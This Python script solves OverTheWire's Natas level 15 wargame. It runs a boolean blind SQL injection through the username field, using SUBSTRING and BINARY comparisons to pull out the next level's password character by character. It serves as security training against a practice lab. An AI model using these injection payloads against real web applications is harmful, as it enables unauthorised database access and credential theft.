#!/usr/bin/env python3

import getpass
import requests

###############################################################################
# Configuration
###############################################################################

# The URL of the level as well as the username for it. There will be a known
# password as well, but read it from the user so that it is not published.
LEVEL_CURRENT = 'natas15'
LEVEL_NEXT = 'natas16'
URL = f'http://{LEVEL_CURRENT}.natas.labs.overthewire.org/index.php'

# The strings used to determine if the partial password guess is incorrect or
# correct.
FAILURE_STRING = "This user doesn't exist."
SUCCESS_STRING = 'This user exists.'

# The length of the target password is assumed to be 32, like all previous
# passwords. The characters used in the password guesses are also assumed to be
# the same as in all previous passwords: a-z, A-Z, and 0-9 - but as an
# optimization only the lowercase characters are needed here.
PASSWORD_LENGTH = 32
PASSWORD_CHARACTERS = 'abcdefghijklmnopqrstuvwxyz0123456789'

# Global counter for HTTP requests
http_request_count = 0

def get_authentication_credentials() -> tuple[str, str]:
    """Prompt the user for the password and return the authentication tuple."""
    password = getpass.getpass(prompt=f'Enter password for {LEVEL_CURRENT}: ')
    return LEVEL_CURRENT, password

def send_post_request(data: dict[str, str], credentials: tuple[str, str]) -> str:
    """
    Sends a POST request with the given data and authentication.
    Returns the response text or raises an exception on failure.
    """
    global http_request_count
    http_request_count += 1
    response = requests.post(URL, auth=credentials, data=data)
    response.raise_for_status()

    return response.text

def response_indicates_success(response_text: str) -> bool:
    if FAILURE_STRING in response_text:
        return False
    elif SUCCESS_STRING in response_text:
        return True
    else:
        raise RuntimeError(f"Unexpected response:\n{response_text}")

def try_password_char(password_guess: str, credentials: tuple[str, str], case_sensitive: bool = True) -> bool:
    """
    Test a single password guess. Returns True if correct, False if incorrect.
    Raises RuntimeError if the response is unexpected.
    """
    comparator = 'BINARY ' if case_sensitive else ''
    payload = {
        'username': f'{LEVEL_NEXT}" AND {comparator}SUBSTRING(password, 1, {len(password_guess)}) = "{password_guess}'
    }

    response_text = send_post_request(payload, credentials)

    return response_indicates_success(response_text)

def confirm_password(password: str, credentials: tuple[str, str]) -> bool:
    """
    Confirms the full password by checking equality in one request.
    Returns True if confirmed, False if not.
    Raises RuntimeError if the response is unexpected.
    """
    payload = {
        'username': f'{LEVEL_NEXT}" AND BINARY password = "{password}'
    }

    response_text = send_post_request(payload, credentials)

    return response_indicates_success(response_text)

def main():
    credentials = get_authentication_credentials()
    password = ''

    while len(password) < PASSWORD_LENGTH:
        for char in PASSWORD_CHARACTERS:
            guess = password + char
            try:
                if try_password_char(guess, credentials, case_sensitive=False):
                    if try_password_char(guess, credentials, case_sensitive=True):
                        # Lowercase
                        matched_char = char
                    elif char.isalpha():
                        # If it matched case-insensitive but not case-sensitive
                        # then it's uppercase
                        matched_char = char.upper()
                    else:
                        # Otherwise it's a digit
                        matched_char = char
                    password += matched_char
                    print(f"Found character {len(password)} of {PASSWORD_LENGTH}: {matched_char}")
                    break
            except requests.RequestException as e:
                print(f"Network error: {e}")
                return
            except RuntimeError as e:
                print(f"Runtime error: {e}")
                return

    print(f"Candidate password: {password}")
    print("Verifying full password...")

    try:
        if confirm_password(password, credentials):
            print(f"Password confirmed: {password}")
        else:
            print(f"Final confirmation failed. Password may be incorrect.")
    except RuntimeError as e:
        print(f"Runtime error: {e}")

    print(f"Total HTTP requests: {http_request_count}")

if __name__ == '__main__':
    main()
